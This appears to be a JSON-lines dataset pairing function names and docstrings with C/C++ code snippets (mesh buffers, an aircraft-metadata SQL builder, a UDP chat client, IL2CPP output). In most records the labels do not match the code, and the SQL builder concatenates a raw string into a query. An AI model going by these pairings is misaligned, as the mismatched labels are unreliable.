{\\n\\t\\t\\t\\t\\t\\t\\t\\tuint8_t indices[3] = {\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint8_t>(face.mIndices[0]),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint8_t>(face.mIndices[1]),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint8_t>(face.mIndices[2])\\n\\t\\t\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t\\t\\tmemcpy_s(p_ib, bufferSize - (p_ib - buffer),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t indices, sizeofElement * 3);\\n\\t\\t\\t\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t\\t}\\n\\n\\t\\t\\t\\t\\t\\tlowest  = std::min(lowest,  face.mIndices[0]);\\n\\t\\t\\t\\t\\t\\tlowest  = std::min(lowest,  face.mIndices[1]);\\n\\t\\t\\t\\t\\t\\tlowest  = std::min(lowest,  face.mIndices[2]);\\n\\t\\t\\t\\t\\t\\thighest = std::max(highest, face.mIndices[0]);\\n\\t\\t\\t\\t\\t\\thighest = std::max(highest, face.mIndices[1]);\\n\\t\\t\\t\\t\\t\\thighest = std::max(highest, face.mIndices[2]);\\n\\n\\t\\t\\t\\t\\t\\tp_ib += sizeofElement * 3;\\n\\t\\t\\t\\t\\t}\\n\\n\\t\\t\\t\\t\\tdrawSet.indexRangeStart = lowest;\\n\\t\\t\\t\\t\\tdrawSet.indexRangeEnd = highest;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\n\\t\\t\\treturn totalElements;\\n\\t\\t}'}","id":4466}
{"content":"{'function_name': 'insert_aircraft_metadata', 'docstring': '\/\/      cout << \"inside databasefunc::insert_aircraft_metadata()\" << endl;', 'code': 'string generate_insert_aircraft_metadata_SQL_command(\\n      int campaign_ID,int mission_ID,int frame_ID,\\n      double epoch_time,std::string frame_prefix,\\n      double longitude,double latitude,double altitude,\\n      double yaw,double pitch,double roll)\\n   {\\n\/\/   cout << \"inside databasefunc::generate_insert_aircraft_metadata_SQL_command()\" << endl;\\n\\n      string SQL_command=\"insert into aircraft_metadata \";\\n      SQL_command += \"(campaign_ID,mission_ID,frame_ID,epoch_time,frame_prefix,longitude,latitude,altitude,yaw,pitch,roll) \";\\n      SQL_command += \"values( \";\\n      SQL_command += stringfunc::number_to_string(campaign_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(mission_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(frame_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(epoch_time)+\",\";\\n      SQL_command += \"\\'\"+frame_prefix+\"\\',\";\\n      SQL_command += stringfunc::number_to_string(longitude)+\",\";\\n      SQL_command += stringfunc::number_to_string(latitude)+\",\";\\n      SQL_command += stringfunc::number_to_string(altitude)+\",\";\\n      SQL_command += stringfunc::number_to_string(yaw)+\",\";\\n      SQL_command += stringfunc::number_to_string(pitch)+\",\";\\n      SQL_command += stringfunc::number_to_string(roll);\\n      SQL_command += \");\";\\n\\n\/\/      cout << SQL_command << endl;\\n      return SQL_command;\\n   }'}","id":4467}
{"content":"{'function_name': 'multicast', 'docstring': '\/* Multicast message to all clients in the list *\/', 'code': 'int main(int argc, char* argv[]) {\\n    int len;\\n    message msg;\\n    pthread_t send_thread, recv_thread;\\n    pthread_t tids_check, tids_response;\\n\\n    if(argc != 3) { \/\/ Wrong number of parameters\\n        printf(\"Input Format Error! Should be [User] [Addr]:[Port]\\\\n\");\\n        exit(-1);\\n    }\\n\\n    \/\/ Set leader\\'s IP and port\\n    name = argv[1];\\n    string addr = argv[2];\\n    int pos = addr.find(\\':\\');\\n    strcpy(leader.ip, addr.substr(0, pos).c_str());\\n    leader.port = atoi(addr.substr(pos + 1, addr.length()).c_str());\\n    \\n    if((server_host_name = gethostbyname(leader.ip)) == 0) {\\n        perror(\"Error in resolving local host\\\\n\");\\n        exit(-1);\\n    }\\n\\n    if((sock_fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {\\n        perror(\"Error in opening socket\\\\n\");\\n        exit(-1);\\n    }\\n\\n    \/\/ Set leader\\'s address\\n    bzero(&addr_server, sizeof(struct sockaddr_in));\\n    addr_server.sin_family = AF_INET;\\n    addr_server.sin_port = htons(leader.port);\\n    addr_server.sin_addr.s_addr = inet_addr(leader.ip);\\n    \/\/addr_server.sin_addr.s_addr = ((struct in_addr *)(server_host_name->h_addr))->s_addr;  \\n\\n    sin_size = sizeof(struct sockaddr_in);\\n\\n    \/\/ Get the local ip and port number\\n\\tchar hostname[1024];\\n\\thostname[1023] = \\'\\\\0\\';\\n\\tgethostname(hostname,1023);\\n\\tstruct hostent *localhost = gethostbyname(hostname);\\n    char *my_ip = inet_ntoa(*((struct in_addr *)localhost->h_addr));\\n    sin.sin_family = AF_INET;\\n    sin.sin_addr.s_addr = htonl(INADDR_ANY);\\n    sin.sin_port = 0;\\n    bind(sock_fd, (struct sockaddr *)&sin, sizeof(struct sockaddr));\\n    getsockname(sock_fd, (struct sockaddr *)&sin, &sin_size);\\n    int local_port = ntohs(sin.sin_port);\\n    my_port = new char[10];\\n    sprintf(my_port, \"%d\", local_port);\\n\\n    \/\/ Send the JOIN message to leader\\n    strcpy(msg.type, \"JOIN\");\\n    strcpy(msg.name, name);\\n    strcpy(msg.content, my_port);\\n    printf(\"%s joining a new chat on %s:%d, listening on %s:%d\\\\n\", name, leader.ip, leader.port, my_ip, local_port);\\n    len = sendto(sock_fd, &msg, sizeof(msg), 0, (struct sockaddr *)&addr_server, sin_size);\\n    if(len < 0) {\\n        perror(\"Error in sending message\\\\n\");\\n        exit(-1);\\n    }\\n\\t\\n\\tstruct timeval timeout;\\n    timeout.tv_sec = 8;\\n    timeout.tv_usec = 0;\\n\\t\/\/len = recvfrom(sock_fd, &msg, sizeof(msg), 0, (struct sockaddr *)&addr_server, &sin_size);\\n\\tif(setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)\\n        printf(\"Cannot Set SO_RCVTIMEO for socket\\\\n\");\\n    if((len = recvfrom(sock_fd, &msg, sizeof(msg), 0, (struct sockaddr *)&addr_server, &sin_size)) < 0) {\\n\\t\\tprintf(\"Sorry, no chat is active on %s, try again later.\\\\n\", argv[2]);\\n\\t\\tprintf(\"Bye.\\\\n\");\\n\\t\\texit(1);\\n    }\\n\\tif(strcmp(msg.type, \"USER LIST\") == 0) {\\n        printf(\"Succeeded, current users:\\\\n\");\\n        addUserToList(msg.content);\\n    }\\n\\telse{\\n\\t\\tprintf(\"Sorry, no chat is active on %s, try again later.\\\\n\", argv[2]);\\n\\t\\tprintf(\"Bye.\\\\n\");\\n\\t\\texit(1);\\n\\t}\\n\\t\\n\\ttimeout.tv_sec = 0;\\n    timeout.tv_usec = 0;\\n\\t\/\/len = recvfrom(sock_fd, &msg, sizeof(msg), 0, (struct sockaddr *)&addr_server, &sin_size);\\n\\tif(setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)\\n        printf(\"Cannot Set SO_RCVTIMEO for socket\\\\n\");\\n\\t\\n    \/\/ Create two threads to send and receive messages\\n    pthread_create(&send_thread, NULL, sendMessage, NULL);\\n    pthread_create(&recv_thread, NULL, recvMessage, NULL);\\n\\n    openCheckedSocket();\\n    server_check_time = getRawTime();\\n    pthread_create(&tids_check, NULL, responseCheck, NULL);\\n    pthread_create(&tids_response, NULL, checkServer, NULL);\\n\\n    pthread_join(send_thread,0);\\n    pthread_join(recv_thread,0);\\n\\n    pthread_join(tids_check,0);\\n    pthread_join(tids_response,0);\\n\\n    close(sock_check);\\n    close(sock_fd);\\n    return 0;\\n}'}","id":4469}
{"content":"{'function_name': 'MimeOleGetExtClassId', 'docstring': '\/\/ Done\\r', 'code': \"MIMEOLEAPI MimeOleGetExtContentTypeW(LPCWSTR pszExtension, LPWSTR *ppszContentType)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    ULONG           i;\\r\\n    HKEY            hkeyExt=NULL;\\r\\n    LPWSTR          pszFull=NULL;\\r\\n    ULONG           cb;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == pszExtension || NULL == ppszContentType || '.' != *pszExtension)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Otherwise, lets lookup the extension in HKEY_CLASSESS_ROOT\\r\\n    if (RegOpenKeyExWrapW(HKEY_CLASSES_ROOT, pszExtension, 0, KEY_READ, &hkeyExt) == ERROR_SUCCESS)\\r\\n    {\\r\\n        \/\/ Query Value\\r\\n        if (RegQueryValueExWrapW(hkeyExt, c_szContentTypeW, 0, NULL, NULL, &cb) == ERROR_SUCCESS)\\r\\n        {\\r\\n            \/\/ Add One\\r\\n            cb += 1;\\r\\n\\r\\n            \/\/ Allocate Size\\r\\n            pszFull = PszAllocW(cb);\\r\\n            if (NULL == pszFull)\\r\\n            {\\r\\n                hr = TrapError(E_OUTOFMEMORY);\\r\\n                goto exit;\\r\\n            }\\r\\n\\r\\n            \/\/ Get the data\\r\\n            if (RegQueryValueExWrapW(hkeyExt, c_szContentTypeW, 0, NULL, (LPBYTE)pszFull, &cb) == ERROR_SUCCESS)\\r\\n            {\\r\\n                \/\/ Set It\\r\\n                *ppszContentType = pszFull;\\r\\n                pszFull = NULL;\\r\\n                goto exit;\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Not found\\r\\n    hr = MIME_E_NOT_FOUND;\\r\\n\\r\\nexit:\\r\\n    \/\/ Close Reg Keys\\r\\n    if (hkeyExt)\\r\\n        RegCloseKey(hkeyExt);\\r\\n\\r\\n    \/\/ Cleanup\\r\\n    MemFree(pszFull);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}\"}","id":4475}
{"content":"{'function_name': 'CalcCutPathLeadIn', 'docstring': '\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa', 'code': 'void CalcCutPathLeadOut( CSmtCheckMdl &CheckMdl, JDNC_TOL &cTol, JDNC_CONNECT3D &cConnect, \\n\\t\\t\\t\\t\\t\\t CSmtCutPath *pPath, CSmtCutPath *&LeadOut, BOOL bCheck, int nType )\\n{\\n\\t\/\/ \u9996\u5148\u5f97\u5230\u53c2\u6570\\n\\tint i = 0 ;\\n\\tFPNT3D pnt, tan, nor = { 0, 0, 1 } ;\\n\\tVEC3D vec ;\\n\\tmathFCpyPnt( pPath->m_pTail->m_fPoint, pnt ) ;\\n\\tif( bCheck )\\n        MathCAM_DefineNormalAt( CheckMdl, cTol, pnt, nor ) ;\\n\\telse\\n\\t{\\n\\t\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t\\t\\tnor[i] = ( ( CSmtCutPointEx *)pPath->m_pTail )->m_fSurfNor[i] ; \\n\\t}\\n\\tif( nType != surfncMethodSFinish )\\n        nor[2] = 0.f ;\\n\\tif( !nc_Normalize( nor, 3 ) )\\n\\t{\\n\\t\\tif( !bCheck )\\n\\t\\t{\\n\\t\\t\\tCSmtCutPointEx *pTail = ( CSmtCutPointEx *)pPath->m_pTail ;\\n\\t\\t\\tmathFCpyPnt( pTail->m_fSurfNor, nor ) ;\\n\\t\\t\\tnor[2] = 0. ;\\n\\t\\t\\tif( !nc_Normalize( nor, 3 ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t}\\n\\t} \\t\\n\\tmathFGetUnitVec( pPath->m_pTail->prev->m_fPoint, pPath->m_pTail->m_fPoint, vec ) ;\\n\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t{\\n\\t\\ttan[i] = TFLOAT( vec[i] ) ;\\n\\t}\\n\\t\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa\\n\\tCSmtCutPath tmpLead( MINI_CONNECT_PATH ) ;\\n\\tif( !MathCAM_GenLeadPathEx( CheckMdl, cTol, cConnect, \\n\\t\\t\\t\\t\\t\\t\\t\\tpnt, tan, nor, tmpLead, bCheck ) )\\n\\t{\\n\\t\\treturn ;\\n\\t}\\n\\tLeadOut = new CSmtCutPath( MINI_CONNECT_PATH ) ;\\n\\tLeadOut->m_bFeedType = JDNC_FEEDTYPE_LEAD ;\\n\\tLeadOut->AppendCutPoint ( tmpLead.m_pHead ) ;\\n\\tLeadOut->DefineBox () ;\\n\\n\\ttmpLead.m_pHead = tmpLead.m_pTail = NULL ;\\n\\ttmpLead.ClearAllPoint () ;\\n}'}","id":4476}
{"content":"{'function_name': 'RealTimeHandler', 'docstring': '\/\/ \u8986\u76d6\u5931\u8d25\u7684\u5373\u53ef\\r', 'code': 'bool Handler(const Food& food, void* ctx, std::string&) noexcept override\\r\\n        { \/\/ terminator | func_expr | var\\r\\n            switch (food.BranchID())\\r\\n            {\\r\\n            case 0:\\r\\n                Ctx(ctx)->m_stackOperand.push_back(Ctx(ctx)->m_stackTerminator.back());\\r\\n                Ctx(ctx)->m_stackTerminator.pop_back();\\r\\n                return true;\\r\\n            case 1:\\r\\n#pragma warning(\"FuncExpr\")\\r\\n                \/\/Ctx(ctx)->m_stackOperand.push_back(Ctx(ctx)->m_stackFuncExpr.back());\\r\\n                \/\/Ctx(ctx)->m_stackFuncExpr.pop_back();\\r\\n                assert(0);\\r\\n                return true;\\r\\n            case 2:\\r\\n                Ctx(ctx)->m_stackOperand.push_back(Ctx(ctx)->m_stackVar.back());\\r\\n                Ctx(ctx)->m_stackVar.pop_back();\\r\\n                return true;\\r\\n            default:\\n                return false;\\r\\n            }\\r\\n        }'}","id":4479}
{"content":"{'function_name': 'projected_density_integrand_cuba', 'docstring': '\/\/ density', 'code': 'int veldist_integrand_cuba(const int ndim[],const double y[], const int*fdim, double fval[], void *fdata){\\n    double y2[3];   veldist_st *P = (veldist_st *) fdata;\\n    int count = 0;\\n    for(int i=0;i<3;i++){\\n        if(i==P->swit) y2[i]=P->x[3];\\n        else{\\n            y2[i]=(P->x2max[count]-P->x2min[count])*y[count]+P->x2min[count];\\n            count++;\\n        }\\n    }\\n    VecDoub X = {P->x[0],P->x[1],P->x[2],y2[0],y2[1],y2[2]};\\n    fval[0] = P->DF->realspace_dist(X);\\n    \/\/ printVector(X);std::cout<<fval[0]<<std::endl;\\n    return 0;\\n}'}","id":4485}
{"content":"{'function_name': 'signedShift', 'docstring': '\/\/ cxx17-warning {{signed shift result}} \\\\\\n                       \/\/ ref-cxx17-warning {{signed shift result}} \\\\\\n                       \/\/ cxx17-note {{signed left shift discards bits}} \\\\\\n                       \/\/ ref-cxx17-note {{signed left shift discards bits}}', 'code': 'constexpr int negativeShift() { \/\/ cxx17-error {{never produces a constant expression}} \\\\\\n                                  \/\/ ref-cxx17-error {{never produces a constant expression}}\\n    return -1 << 2; \/\/ cxx17-warning {{shifting a negative signed value is undefined}} \\\\\\n                    \/\/ ref-cxx17-warning {{shifting a negative signed value is undefined}} \\\\\\n                    \/\/ cxx17-note {{left shift of negative value -1}} \\\\\\n                    \/\/ ref-cxx17-note {{left shift of negative value -1}}\\n  }'}","id":4486}
{"content":"{'function_name': 'AnalyzeThread', 'docstring': '\/\/Change Button', 'code': 'UINT ImageRecvThread(LPVOID pParam)\\n{\\n\\n\\t\/*\\n\\t\\tImage recv \ud558\ub294\uac70 \uc774\ubd80\ubd84\uc73c\ub85c \ubd84\ub9ac\ud574\uc11c \uc801\uc6a9\\n\\t\\tbut, \uc774\ubbf8\uc9c0 \ubc1b\ub294\uac70\ub791 \ubfcc\ub9ac\ub294\uac70\ub791 \uc2f1\ud06c\uac00 \ub9de\uc744\uae4c?\\n\\t*\/\\n\\n\\treturn 0;\\n}'}","id":4487}
{"content":"{'function_name': 'largestSumContigousSequence', 'docstring': '\/\/whether to return least negative number, 0 (seq len) or max_int as error', 'code': 'int main()\\n{\\n    vector<int> arr = {2, -8, 3, -2, 4, -10}; \/\/some positive, some negative\\n    cout << largestSumContigousSequence(arr) << endl; \/\/should be 5\\n    cout << largestSumContigousSequence2(arr) << endl; \/\/should be 5\\n\\n    arr = {-2, -8, -3, -2, -4, -10}; \/\/all negative\\n    cout << largestSumContigousSequence(arr) << endl; \/\/should be 0\\n    cout << largestSumContigousSequence2(arr) << endl; \/\/should be -2\\n\\n    arr = {2, 8, 3, 2, 4, 10}; \/\/ all positive\\n    cout << largestSumContigousSequence(arr) << endl; \/\/should be 29\\n    cout << largestSumContigousSequence2(arr) << endl; \/\/should be 29\\n\\n    arr = {-2, -8, -3, 2, 4, 10}; \/\/some positive, some negative\\n    cout << largestSumContigousSequence(arr) << endl; \/\/should be 16\\n    cout << largestSumContigousSequence2(arr) << endl; \/\/should be 16\\n    return 0;\\n}'}","id":4498}
{"content":"{'function_name': 'mirror_tree', 'docstring': '\/\/\\tswap(node->left, node->right);\\r', 'code': 'bool compare_trees(binarytree *node1, binarytree* node2){\\r\\n\\tif(node1==NULL && node2==NULL)return true;\\r\\n\\tif(node1==NULL || node2==NULL)return false;\\r\\n\\tif(node1->data!=node2->data){\\r\\n\\t\\tcout<<\"mismatch at \"<<node1->data<<\" \"<<node2->data<<endl;\\r\\n\\t\\treturn false;\\r\\n\\t}\\r\\n\/\/\\telse if(node1->right->data!=node2->left->data){\\r\\n\/\/\\t\\tcout<<\"mismatch at \"<<node1->right->data<<\" \"<<node2->left->data<<endl;\\r\\n\/\/\\t\\treturn false;\\r\\n\/\/\\t}\\r\\n\\telse \\r\\n\\t\\treturn true;\\r\\n\\treturn compare_trees(node1->left, node2->right) &&  compare_trees(node1->right, node2->left);\\r\\n\/\/\\treturn true;\\r\\n}'}","id":4511}
{"content":"{'function_name': 'CalculoHora', 'docstring': '\/\/agrego la hora inicial\\r', 'code': 'AnsiString __fastcall mEmpaquetar(AnsiString sComando)\\r\\n{\\r\\n  AnsiString sTop,sCmd,sFSN;\\r\\n  AnsiString sPaquete,sHeader,sTail,sProcess,s,sData;\\r\\n  int nTop,msg;\\r\\n  int j;\\r\\n  char *c,car;\\r\\n\\r\\n  \/\/sComando=sComando.UpperCase(); \/\/mayusculas\\r\\n  sComando=ChauCaracter(sComando,\\' \\'); \/\/quita blancos\\r\\n  if (sComando.IsEmpty())\\r\\n        return \"-1\";\\r\\n  sData=sComando;\\r\\n\\r\\n  s.SetLength(1);\\r\\n\\r\\n  for (int i=1;i<=sData.Length();i++){\\r\\n       s= sData.SubString(i,1);\\r\\n       c= s.c_str();\\r\\n       car = (char) *c;\\r\\n       j=toascii(car);\\r\\n       sProcess = sProcess + sProcess.IntToHex(j,2);\\r\\n  }\\r\\n\\r\\n  return sProcess;\\r\\n}'}","id":4513}
{"content":"{'function_name': 'vpgl_load_rational_camera_process', 'docstring': '\/\/ get the inputs', 'code': 'bool vpgl_load_rational_camera_from_txt_process_cons(bprb_func_process& pro)\\n{\\n  \/\/this process takes one input: the filename\\n  bool ok=false;\\n  std::vector<std::string> input_types;\\n  input_types.emplace_back(\"vcl_string\");\\n  ok = pro.set_input_types(input_types);\\n  if (!ok) return ok;\\n\\n  std::vector<std::string> output_types;\\n  output_types.emplace_back(\"vpgl_camera_double_sptr\");  \/\/ label image\\n  ok = pro.set_output_types(output_types);\\n  if (!ok) return ok;\\n\\n  return true;\\n\\n}'}","id":4514}
{"content":"{'function_name': 'Dictionary_2_System_Collections_ICollection_CopyTo_m00FFA00DDCC0D5E34ED7F47F3306BAA48306A3AE_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'IL2CPP_METHOD_ATTR void Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_gshared (Dictionary_2_t153D0F5AE46083080C7F009F4157945894AE5172 * __this, RuntimeObject * ___key0, RuntimeObject * ___value1, const RuntimeMethod* method)\\n{\\n\\tstatic bool s_Il2CppMethodInitialized;\\n\\tif (!s_Il2CppMethodInitialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_MetadataUsageId);\\n\\t\\ts_Il2CppMethodInitialized = true;\\n\\t}\\n\\tint64_t V_0 = 0;\\n\\tint32_t V_1 = 0;\\n\\tException_t * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = -1;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tRuntimeObject * L_0 = ___key0;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_000e;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_1 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_1, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_RuntimeMethod_var);\\n\\t}\\n\\nIL_000e:\\n\\t{\\n\\t\\tRuntimeObject * L_2 = ___value1;\\n\\t\\tif (L_2)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\til2cpp_codegen_initobj((&V_0), sizeof(int64_t));\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_4 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_4, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_4, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_RuntimeMethod_var);\\n\\t}\\n\\nIL_002c:\\n\\t{\\n\\t}\\n\\nIL_002d:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tRuntimeObject * L_5 = ___key0;\\n\\t\\t\\tV_1 = (int32_t)((*(int32_t*)((int32_t*)UnBox(L_5, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 27)))));\\n\\t\\t}\\n\\nIL_0034:\\n\\t\\ttry\\n\\t\\t{ \/\/ begin try (depth: 2)\\n\\t\\t\\tint32_t L_6 = V_1;\\n\\t\\t\\tRuntimeObject * L_7 = ___value1;\\n\\t\\t\\tNullCheck((Dictionary_2_t153D0F5AE46083080C7F009F4157945894AE5172 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t153D0F5AE46083080C7F009F4157945894AE5172 *, int32_t, int64_t, const RuntimeMethod*))IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35)->methodPointer)((Dictionary_2_t153D0F5AE46083080C7F009F4157945894AE5172 *)__this, (int32_t)L_6, (int64_t)((*(int64_t*)((int64_t*)UnBox(L_7, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 17))))), \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35));\\n\\t\\t\\tgoto IL_0064;\\n\\t\\t} \/\/ end try (depth: 2)\\n\\t\\tcatch(Il2CppExceptionWrapper& e)\\n\\t\\t{\\n\\t\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\t\\tgoto CATCH_0043;\\n\\t\\t\\tthrow e;\\n\\t\\t}\\n\\nCATCH_0043:\\n\\t\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\t\\tRuntimeObject * L_8 = ___value1;\\n\\t\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_9 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 36)) };\\n\\t\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\t\\tType_t * L_10 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_9, \/*hidden argument*\/NULL);\\n\\t\\t\\tString_t* L_11 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_8, (RuntimeObject *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_12 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_12, (String_t*)L_11, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_12, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_RuntimeMethod_var);\\n\\t\\t} \/\/ end catch (depth: 2)\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0087;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\tgoto CATCH_0066;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0066:\\n\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\tRuntimeObject * L_13 = ___key0;\\n\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_14 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 37)) };\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_15 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_14, \/*hidden argument*\/NULL);\\n\\t\\tString_t* L_16 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_13, (RuntimeObject *)L_15, \/*hidden argument*\/NULL);\\n\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_17 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_17, (String_t*)L_16, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_17, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m4CBD9C33F0BFED5D892D55806BD1B36FE2A787D1_RuntimeMethod_var);\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0087:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":4534}
